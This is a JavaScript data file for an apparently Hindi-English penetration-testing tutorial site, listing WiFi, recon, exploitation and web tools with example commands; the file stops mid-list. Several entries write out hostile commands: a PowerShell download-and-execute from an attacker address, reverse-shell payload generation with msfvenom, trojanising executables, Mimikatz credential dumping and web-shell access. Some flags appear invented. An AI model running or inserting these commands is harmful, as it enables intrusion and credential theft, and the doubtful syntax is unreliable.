import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import TutorialLayout from '../components/TutorialLayout'
import CodeBlock from '../components/CodeBlock'

const tools = [
  {
    name: 'Aircrack ng',
    slug: 'aircrack-ng',
    category: 'WiFi',
    commands: ['aircrack-ng --help', 'aircrack-ng -v', 'aircrack-ng -a2 -b 00:11:22:33:44:55 capture.cap'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Airgeddon',
    slug: 'airgeddon',
    category: 'WiFi',
    commands: ['airgeddon --help', 'airgeddon -v', 'airgeddon --attack wpa_handshake --interface wlan0mon'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Bully',
    slug: 'bully',
    category: 'WiFi',
    commands: ['bully --help', 'bully -v', 'bully -b 00:11:22:33:44:55 -p 1234 wlan0mon'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Cowpatty',
    slug: 'cowpatty',
    category: 'WiFi',
    commands: ['cowpatty --help', 'cowpatty -v', 'cowpatty -r capture.cap -s MyWiFi -d wordlist.txt'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Eaphammer',
    slug: 'eaphammer',
    category: 'WiFi',
    commands: ['eaphammer --help', 'eaphammer -v', 'eaphammer --cert-wizard --create-pki --hostname portal.lan'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Fern WiFi Cracker',
    slug: 'fern-wifi',
    category: 'WiFi',
    commands: ['fern-wifi --help', 'fern-wifi -v', 'fern-wifi-cracker -i wlan0mon -w wordlist.txt -q'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Fluxion',
    slug: 'fluxion',
    category: 'WiFi',
    commands: ['fluxion --help', 'fluxion -v', 'fluxion -i wlan0mon -t 10 --hash-handshake'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Hcxdumptool',
    slug: 'hcxdumptool',
    category: 'WiFi',
    commands: ['hcxdumptool --help', 'hcxdumptool -v', 'hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Hostapd mana',
    slug: 'hostapd-mana',
    category: 'WiFi',
    commands: ['hostapd-mana --help', 'hostapd-mana -v', 'hostapd-mana /etc/hostapd-mana/mana.conf'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Kismet',
    slug: 'kismet',
    category: 'WiFi',
    commands: ['kismet --help', 'kismet -v', 'kismet -c wlan0mon --verbose'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Macchanger',
    slug: 'macchanger',
    category: 'WiFi',
    commands: ['macchanger --help', 'macchanger -v', 'macchanger -r wlan0 --mac XX:XX:XX:XX:XX:XX'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Mana Toolkit',
    slug: 'mana-toolkit',
    category: 'WiFi',
    commands: ['mana-toolkit --help', 'mana-toolkit -v', 'mana-toolkit -i wlan0mon -l /tmp/creds'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'MDK3',
    slug: 'mdk3',
    category: 'WiFi',
    commands: ['mdk3 --help', 'mdk3 -v', 'mdk3 wlan0mon d -c 6 -b blacklist.txt'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'MDK4',
    slug: 'mdk4',
    category: 'WiFi',
    commands: ['mdk4 --help', 'mdk4 -v', 'mdk4 wlan0mon b -c 6 blacklist.txt'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Pixiewps',
    slug: 'pixiewps',
    category: 'WiFi',
    commands: ['pixiewps --help', 'pixiewps -v', 'pixiewps -e PKe -r PKr -s1 -m1 -a -n pin'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Reaver',
    slug: 'reaver',
    category: 'WiFi',
    commands: ['reaver --help', 'reaver -v', 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Sslstrip',
    slug: 'sslstrip',
    category: 'WiFi',
    commands: ['sslstrip --help', 'sslstrip -v', 'sslstrip -l 8080 -a -w sslstrip.log'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Wash',
    slug: 'wash',
    category: 'WiFi',
    commands: ['wash --help', 'wash -v', 'wash -i wlan0mon -C'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Wifite',
    slug: 'wifite',
    category: 'WiFi',
    commands: ['wifite --help', 'wifite -v', 'wifite --wpadt --pmkid --wpa --dict wordlist.txt'],
    description: 'wireless network penetration testing aur WiFi security auditing ke liye ek powerful tool.',
  },
  {
    name: 'Amass',
    slug: 'amass',
    category: 'Recon',
    commands: ['amass --help', 'amass -v', 'amass enum -d example.com -o domains.txt'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Arp scan',
    slug: 'arp-scan',
    category: 'Recon',
    commands: ['arp-scan --help', 'arp-scan -v', 'arp-scan --localnet --interface eth0'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'BIND9',
    slug: 'bind9',
    category: 'Recon',
    commands: ['bind9 --help', 'bind9 -v', 'dig @8.8.8.8 example.com ANY +short'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Bloodhound',
    slug: 'bloodhound',
    category: 'Recon',
    commands: ['bloodhound --help', 'bloodhound -v', 'bloodhound-python -d example.local -u user -p pass -gc dc.example.local'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Bluelog',
    slug: 'bluelog',
    category: 'Recon',
    commands: ['bluelog --help', 'bluelog -v', 'bluelog -i hci0 -v -l scan.log'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'BlueSnarfer',
    slug: 'bluesnarfer',
    category: 'Recon',
    commands: ['bluesnarfer --help', 'bluesnarfer -v', 'bluesnarfer -b 00:11:22:33:44:55 -r'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'CutyCapt',
    slug: 'cutycapt',
    category: 'Recon',
    commands: ['cutycapt --help', 'cutycapt -v', 'cutycapt --url=https://example.com --out=screenshot.png'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'DMitry',
    slug: 'dmitry',
    category: 'Recon',
    commands: ['dmitry --help', 'dmitry -v', 'dmitry -winse example.com'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'DNSchef',
    slug: 'dnschef',
    category: 'Recon',
    commands: ['dnschef --help', 'dnschef -v', 'dnschef --fakeip 127.0.0.1 --logfile dns.log'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Dnsenum',
    slug: 'dnsenum',
    category: 'Recon',
    commands: ['dnsenum --help', 'dnsenum -v', 'dnsenum --enum example.com -f subdomains.txt -o dns.txt'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Dnsmap',
    slug: 'dnsmap',
    category: 'Recon',
    commands: ['dnsmap --help', 'dnsmap -v', 'dnsmap example.com -w wordlist.txt -r results.txt'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Dnsrecon',
    slug: 'dnsrecon',
    category: 'Recon',
    commands: ['dnsrecon --help', 'dnsrecon -v', 'dnsrecon -d example.com -t axfr --json'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Dradis',
    slug: 'dradis',
    category: 'Recon',
    commands: ['dradis --help', 'dradis -v', 'dradis start --port 3000'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Enum4linux',
    slug: 'enum4linux',
    category: 'Recon',
    commands: ['enum4linux --help', 'enum4linux -v', 'enum4linux -a 192.168.1.10 -l enum.log'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Faraday',
    slug: 'faraday',
    category: 'Recon',
    commands: ['faraday --help', 'faraday -v', 'faraday-server --port 5985 --password secret'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Fierce',
    slug: 'fierce',
    category: 'Recon',
    commands: ['fierce --help', 'fierce -v', 'fierce --domain example.com --subdomains subdomains.txt'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Finger',
    slug: 'finger',
    category: 'Recon',
    commands: ['finger --help', 'finger -v', 'finger -l user@example.com'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'IKE-Scan',
    slug: 'ike-scan',
    category: 'Recon',
    commands: ['ike-scan --help', 'ike-scan -v', 'ike-scan -M -A example.com --showbackoff'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'KeepNote',
    slug: 'keepnote',
    category: 'Recon',
    commands: ['keepnote --help', 'keepnote -v', 'keepnote --import /tmp/notes.xml'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'LBD',
    slug: 'lbd',
    category: 'Recon',
    commands: ['lbd --help', 'lbd -v', 'lbd example.com'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Maltego',
    slug: 'maltego',
    category: 'Recon',
    commands: ['maltego --help', 'maltego -v', 'maltego --run Transform --entity example.com'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Masscan',
    slug: 'masscan',
    category: 'Recon',
    commands: ['masscan --help', 'masscan -v', 'masscan 10.0.0.0/8 -p80,443,22 --rate=1000 -oJ scan.json'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Metagoofil',
    slug: 'metagoofil',
    category: 'Recon',
    commands: ['metagoofil --help', 'metagoofil -v', 'metagoofil -d example.com -t pdf,xls -l 20 -o docs/'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Naabu',
    slug: 'naabu',
    category: 'Recon',
    commands: ['naabu --help', 'naabu -v', 'naabu -host 10.0.0.0/24 -p 80,443,22 -o ports.txt'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'NBTScan',
    slug: 'nbtscan',
    category: 'Recon',
    commands: ['nbtscan --help', 'nbtscan -v', 'nbtscan -r 192.168.1.0/24'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Netdiscover',
    slug: 'netdiscover',
    category: 'Recon',
    commands: ['netdiscover --help', 'netdiscover -v', 'netdiscover -r 192.168.1.0/24 -i eth0 -P'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Nmap',
    slug: 'nmap',
    category: 'Recon',
    commands: ['nmap --help', 'nmap -v', 'nmap -sV -sC -A -p- -T4 target.com -oN scan.nmap'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'P0f',
    slug: 'p0f',
    category: 'Recon',
    commands: ['p0f --help', 'p0f -v', 'p0f -i eth0 -o p0f.log -f p0f.fp'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Recon ng',
    slug: 'recon-ng',
    category: 'Recon',
    commands: ['recon-ng --help', 'recon-ng -v', 'recon-ng -r recon-script.rc'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'RPCBind',
    slug: 'rpcbind',
    category: 'Recon',
    commands: ['rpcbind --help', 'rpcbind -v', 'rpcinfo -p 192.168.1.10'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Sherlock',
    slug: 'sherlock',
    category: 'Recon',
    commands: ['sherlock --help', 'sherlock -v', 'sherlock user123 --output results.txt'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Showmount',
    slug: 'showmount',
    category: 'Recon',
    commands: ['showmount --help', 'showmount -v', 'showmount -e 192.168.1.10'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'SMBClient',
    slug: 'smbclient',
    category: 'Recon',
    commands: ['smbclient --help', 'smbclient -v', 'smbclient -L //192.168.1.10 -N'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'SMBMap',
    slug: 'smbmap',
    category: 'Recon',
    commands: ['smbmap --help', 'smbmap -v', 'smbmap -H 192.168.1.10 -u guest -p ""'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'SNMP-Check',
    slug: 'snmp-check',
    category: 'Recon',
    commands: ['snmp-check --help', 'snmp-check -v', 'snmp-check -t 192.168.1.1 -c public'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Sparta',
    slug: 'sparta',
    category: 'Recon',
    commands: ['sparta --help', 'sparta -v', 'sparta -i targets.txt -t 50'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Spooftooph',
    slug: 'spooftooph',
    category: 'Recon',
    commands: ['spooftooph --help', 'spooftooph -v', 'spooftooph -i hci0 -n "NewName" -a 00:11:22:33:44:55'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'SSLScan',
    slug: 'sslscan',
    category: 'Recon',
    commands: ['sslscan --help', 'sslscan -v', 'sslscan --targets=targets.txt --no-colour'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'SSLyze',
    slug: 'sslyze',
    category: 'Recon',
    commands: ['sslyze --help', 'sslyze -v', 'sslyze --regular example.com:443'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Subfinder',
    slug: 'subfinder',
    category: 'Recon',
    commands: ['subfinder --help', 'subfinder -v', 'subfinder -d example.com -all -o subs.txt'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Theharvester',
    slug: 'theharvester',
    category: 'Recon',
    commands: ['theharvester --help', 'theharvester -v', 'theharvester -d example.com -b google,linkedin -f results.html'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Unicornscan',
    slug: 'unicornscan',
    category: 'Recon',
    commands: ['unicornscan --help', 'unicornscan -v', 'unicornscan -Iv 192.168.1.0/24:1-65535'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'URLCrazy',
    slug: 'urlcrazy',
    category: 'Recon',
    commands: ['urlcrazy --help', 'urlcrazy -v', 'urlcrazy -p example.com -o results.csv'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Whois',
    slug: 'whois',
    category: 'Recon',
    commands: ['whois --help', 'whois -v', 'whois example.com | grep -E "Name|Organization|Country"'],
    description: 'reconnaissance aur information gathering ke liye ek important tool jo target ke baare mein data collect karta hai.',
  },
  {
    name: 'Armitage',
    slug: 'armitage',
    category: 'Exploitation',
    commands: ['armitage --help', 'armitage -v', 'armitage --connect 10.0.0.5:55553 --user msf'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Backdoor Factory',
    slug: 'backdoor-factory',
    category: 'Exploitation',
    commands: ['backdoor-factory --help', 'backdoor-factory -v', 'backdoor-factory -f putty.exe -S -l -J -c -i 10.0.0.5 -p 4444 -o backdoored.exe'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Beef xss',
    slug: 'beef-xss',
    category: 'Exploitation',
    commands: ['beef-xss --help', 'beef-xss -v', 'beef-xss -c /etc/beef-xss/config.yaml'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Checksec',
    slug: 'checksec',
    category: 'Exploitation',
    commands: ['checksec --help', 'checksec -v', 'checksec --file=/bin/bash'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Commix',
    slug: 'commix',
    category: 'Exploitation',
    commands: ['commix --help', 'commix -v', 'commix --url="http://target.com/page.php?id=1" --level=3'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Crackmapexec',
    slug: 'crackmapexec',
    category: 'Exploitation',
    commands: ['crackmapexec --help', 'crackmapexec -v', 'crackmapexec smb 192.168.1.0/24 -u admin -p password123'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Empire',
    slug: 'empire',
    category: 'Exploitation',
    commands: ['empire --help', 'empire -v', 'python3 empire --rest --username admin --password password123'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Evil winrm',
    slug: 'evil-winrm',
    category: 'Exploitation',
    commands: ['evil-winrm --help', 'evil-winrm -v', 'evil-winrm -i 192.168.1.10 -u Administrator -p P@ssw0rd'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Exe2Hex',
    slug: 'exe2hex',
    category: 'Exploitation',
    commands: ['exe2hex --help', 'exe2hex -v', 'exe2hex -x /tmp/backdoor.exe -t cp -s 512'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Impacket',
    slug: 'impacket',
    category: 'Exploitation',
    commands: ['impacket --help', 'impacket -v', 'impacket-secretsdump domain/user:pass@192.168.1.10'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Koadic',
    slug: 'koadic',
    category: 'Exploitation',
    commands: ['koadic --help', 'koadic -v', 'python3 koadic -s staging --host 10.0.0.5 --port 9999'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Merlin',
    slug: 'merlin',
    category: 'Exploitation',
    commands: ['merlin --help', 'merlin -v', 'merlinServer -i 0.0.0.0 -p 443 -x SHA256'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Metasploit framework',
    slug: 'metasploit-framework',
    category: 'Exploitation',
    commands: ['metasploit-framework --help', 'metasploit-framework -v', 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; run"'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Mimikatz',
    slug: 'mimikatz',
    category: 'Exploitation',
    commands: ['mimikatz --help', 'mimikatz -v', 'mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'MSFPayload',
    slug: 'msfpayload',
    category: 'Exploitation',
    commands: ['msfpayload --help', 'msfpayload -v', 'msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 X > payload.exe'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Msfvenom',
    slug: 'msfvenom',
    category: 'Exploitation',
    commands: ['msfvenom --help', 'msfvenom -v', 'msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o payload.apk'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Nishang',
    slug: 'nishang',
    category: 'Exploitation',
    commands: ['nishang --help', 'nishang -v', 'powershell -ExecutionPolicy Bypass -File Nishang.ps1'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'One Gadget',
    slug: 'one_gadget',
    category: 'Exploitation',
    commands: ['one_gadget --help', 'one_gadget -v', 'one_gadget /lib/x86_64-linux-gnu/libc.so.6'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'PowerSploit',
    slug: 'powersploit',
    category: 'Exploitation',
    commands: ['powersploit --help', 'powersploit -v', 'powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.5/PowerUp.ps1\")"'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Pupy',
    slug: 'pupy',
    category: 'Exploitation',
    commands: ['pupy --help', 'pupy -v', 'python3 pupy.py --host 10.0.0.5 --port 443 --ssl'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Pwntools',
    slug: 'pwntools',
    category: 'Exploitation',
    commands: ['pwntools --help', 'pwntools -v', 'python3 -c "from pwn import *; e = ELF(\"./binary\"); print(e.checksec())"'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Ropper',
    slug: 'ropper',
    category: 'Exploitation',
    commands: ['ropper --help', 'ropper -v', 'ropper --file /bin/ls --search "pop rdi"'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Searchsploit',
    slug: 'searchsploit',
    category: 'Exploitation',
    commands: ['searchsploit --help', 'searchsploit -v', 'searchsploit apache 2.4.49 -o'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Setoolkit',
    slug: 'setoolkit',
    category: 'Exploitation',
    commands: ['setoolkit --help', 'setoolkit -v', 'setoolkit -c "Social-Engineering Attacks" -m 1'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'ShellNoob',
    slug: 'shellnoob',
    category: 'Exploitation',
    commands: ['shellnoob --help', 'shellnoob -v', 'shellnoob -c 0x7fffffff -f linux/x64 -s execve -o shellcode.bin'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Shellter',
    slug: 'shellter',
    category: 'Exploitation',
    commands: ['shellter --help', 'shellter -v', 'shellter --mode auto --input installer.exe --output infected.exe'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'SilentTrinity',
    slug: 'silenttrinity',
    category: 'Exploitation',
    commands: ['silenttrinity --help', 'silenttrinity -v', 'python3 SilentTrinity.py --client --host 10.0.0.5 --port 443'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'THC-IPv6',
    slug: 'thc-ipv6',
    category: 'Exploitation',
    commands: ['thc-ipv6 --help', 'thc-ipv6 -v', 'thc-ipv6-fake-dns6 eth0 2001:db8::1 example.com'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'TrevorC2',
    slug: 'trevorc2',
    category: 'Exploitation',
    commands: ['trevorc2 --help', 'trevorc2 -v', 'python3 trevorc2_server.py -c config.json'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Veil',
    slug: 'veil',
    category: 'Exploitation',
    commands: ['veil --help', 'veil -v', 'veil -t Evasion -p python/shellcode_inject -o payload'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Weevely',
    slug: 'weevely',
    category: 'Exploitation',
    commands: ['weevely --help', 'weevely -v', 'weevely http://target.com/uploads/shell.php password'],
    description: 'vulnerability exploitation aur penetration testing ke liye ek advanced tool.',
  },
  {
    name: 'Burpsuite',
    slug: 'burpsuite',
    category: 'Web',
    commands: ['burpsuite --help', 'burpsuite -v', 'java -jar burpsuite_pro.jar --project=target --config-file=config.json'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Cadaver',
    slug: 'cadaver',
    category: 'Web',
    commands: ['cadaver --help', 'cadaver -v', 'cadaver http://target.com/webdav/'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'CMSMap',
    slug: 'cmsmap',
    category: 'Web',
    commands: ['cmsmap --help', 'cmsmap -v', 'cmsmap -t https://target.com -f Joomla -d'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'DavTest',
    slug: 'davtest',
    category: 'Web',
    commands: ['davtest --help', 'davtest -v', 'davtest -url http://target.com/webdav/'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Dirb',
    slug: 'dirb',
    category: 'Web',
    commands: ['dirb --help', 'dirb -v', 'dirb http://target.com /usr/share/wordlists/dirb/common.txt -o dirb.txt'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'DirBuster',
    slug: 'dirbuster',
    category: 'Web',
    commands: ['dirbuster --help', 'dirbuster -v', 'dirbuster -u http://target.com -l /usr/share/wordlists/dirb/big.txt -r 200'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Ffuf',
    slug: 'ffuf',
    category: 'Web',
    commands: ['ffuf --help', 'ffuf -v', 'ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301 -t 50'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Fimap',
    slug: 'fimap',
    category: 'Web',
    commands: ['fimap --help', 'fimap -v', 'fimap -u "http://target.com/page.php?id=1" -d -v'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Gobuster',
    slug: 'gobuster',
    category: 'Web',
    commands: ['gobuster --help', 'gobuster -v', 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'HTTP-Enum',
    slug: 'http-enum',
    category: 'Web',
    commands: ['http-enum --help', 'http-enum -v', 'http-enum -t 192.168.1.1 -p 80 -d /usr/share/nmap/nselib/data/http-enum-files.lst'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'HTTrack',
    slug: 'httrack',
    category: 'Web',
    commands: ['httrack --help', 'httrack -v', 'httrack http://target.com -O ./mirror --robots=0 -v'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'JoomScan',
    slug: 'joomscan',
    category: 'Web',
    commands: ['joomscan --help', 'joomscan -v', 'joomscan --url https://target.com --enumerate-components'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'jSQL Injection',
    slug: 'jsql',
    category: 'Web',
    commands: ['jsql --help', 'jsql -v', 'java -jar jsql-injection.jar -u "http://target.com/page.php?id=1" -m GET'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Katana',
    slug: 'katana',
    category: 'Web',
    commands: ['katana --help', 'katana -v', 'katana -u http://target.com -d 3 -o urls.txt'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Nikto',
    slug: 'nikto',
    category: 'Web',
    commands: ['nikto --help', 'nikto -v', 'nikto -h http://target.com -ssl -Format html -o nikto.html'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Nuclei',
    slug: 'nuclei',
    category: 'Web',
    commands: ['nuclei --help', 'nuclei -v', 'nuclei -u http://target.com -severity critical,high -o vulns.txt'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'SidGuess',
    slug: 'sidguess',
    category: 'Web',
    commands: ['sidguess --help', 'sidguess -v', 'sidguess -i 192.168.1.10 -d ORCL -p 1521'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Skipfish',
    slug: 'skipfish',
    category: 'Web',
    commands: ['skipfish --help', 'skipfish -v', 'skipfish -o /tmp/skipfish -S /usr/share/skipfish/dictionaries/ -W wordlist.txt http://target.com'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Slowloris',
    slug: 'slowloris',
    category: 'Web',
    commands: ['slowloris --help', 'slowloris -v', 'slowloris -s 500 -p 80 target.com'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
